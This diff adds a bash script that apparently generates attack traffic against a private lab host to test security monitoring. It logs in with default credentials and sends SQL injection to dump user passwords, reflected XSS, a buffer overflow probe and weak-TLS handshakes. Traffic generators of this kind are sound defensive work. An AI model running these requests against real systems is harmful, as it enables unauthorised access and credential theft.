@@ -1,0 +1,90 @@
+#!/bin/bash
+set -euo pipefail
+
+target=10.20.20.20
+state_dir="${XDG_RUNTIME_DIR:-/tmp}/soc-attack-${UID}"
+cookie="$state_dir/cookies.txt"
+mkdir -p "$state_dir"
+chmod 700 "$state_dir"
+
+token_from() {
+  sed -n 's/.*name=["'\'']user_token["'\''][^>]*value=["'\'']\([^"'\'']*\)["'\''].*/\1/p' | head -n1
+}
+
+login() {
+  local token
+  token="$(curl -fsS -c "$cookie" "http://${target}/login.php" | token_from)"
+  curl -fsS -b "$cookie" -c "$cookie" -X POST "http://${target}/login.php" \
+    --data-urlencode 'username=admin' --data-urlencode 'password=password' \
+    --data-urlencode 'Login=Login' --data-urlencode "user_token=${token}" >/dev/null
+  token="$(curl -fsS -b "$cookie" "http://${target}/security.php" | token_from)"
+  curl -fsS -b "$cookie" -c "$cookie" -X POST "http://${target}/security.php" \
+    --data-urlencode 'security=low' --data-urlencode 'seclev_submit=Submit' \
+    --data-urlencode "user_token=${token}" >/dev/null
+}
+
+scenario_baseline() {
+  curl -fsS "http://${target}/login.php" >/dev/null
+}
+
+scenario_sqli() {
+  login
+  curl -fsS -b "$cookie" --get "http://${target}/vulnerabilities/sqli/" \
+    --data-urlencode "id=1' UNION SELECT user,password FROM users#" \
+    --data-urlencode 'Submit=Submit' >/dev/null
+}
+
+scenario_xss() {
+  login
+  curl -fsS -b "$cookie" --get "http://${target}/vulnerabilities/xss_r/" \
+    --data-urlencode 'name=<script>alert(1)</script>' >/dev/null
+}
+
+scenario_overflow() {
+  python3 - <<'PY'
+import socket
+with socket.create_connection(("10.20.20.20", 9999), timeout=5) as sock:
+    sock.sendall(b"OVERFLOW_TEST:" + b"A" * 2048)
+    sock.recv(64)
+PY
+}
+
+tls_probe() {
+  local port="$1"; shift
+  timeout 10 openssl s_client -connect "${target}:${port}" "$@" </dev/null >/dev/null 2>&1 || true
+}
+
+scenario_legacy_tls() { tls_probe 4433 -tls1 -cipher 'DEFAULT:@SECLEVEL=0' -servername legacy.soc.test; }
+scenario_expired_tls() { tls_probe 4434 -tls1_2 -servername expired.soc.test; }
+scenario_rogue_tls() { tls_probe 4435 -tls1_2 -servername rogue.soc.test; }
+scenario_weak_cipher() { tls_probe 4436 -tls1_2 -cipher 'AES128-SHA:@SECLEVEL=0' -servername weak.soc.test; }
+scenario_hash() { curl -fsS "http://${target}:8080/known.bin" -o "$state_dir/known.bin"; }
+
+run_all() {
+  scenario_sqli
+  scenario_xss
+  scenario_overflow
+  scenario_legacy_tls
+  scenario_expired_tls
+  scenario_rogue_tls
+  scenario_weak_cipher
+  scenario_hash
+}
+
+case "${1:-}" in
+  baseline) scenario_baseline ;;
+  sqli) scenario_sqli ;;
+  xss) scenario_xss ;;
+  overflow) scenario_overflow ;;
+  legacy-tls) scenario_legacy_tls ;;
+  expired-tls) scenario_expired_tls ;;
+  rogue-tls) scenario_rogue_tls ;;
+  weak-cipher) scenario_weak_cipher ;;
+  hash) scenario_hash ;;
+  all) run_all ;;
+  *)
+    echo "usage: soc-attack {baseline|sqli|xss|overflow|legacy-tls|expired-tls|rogue-tls|weak-cipher|hash|all}" >&2
+    exit 64
+    ;;
+esac
+
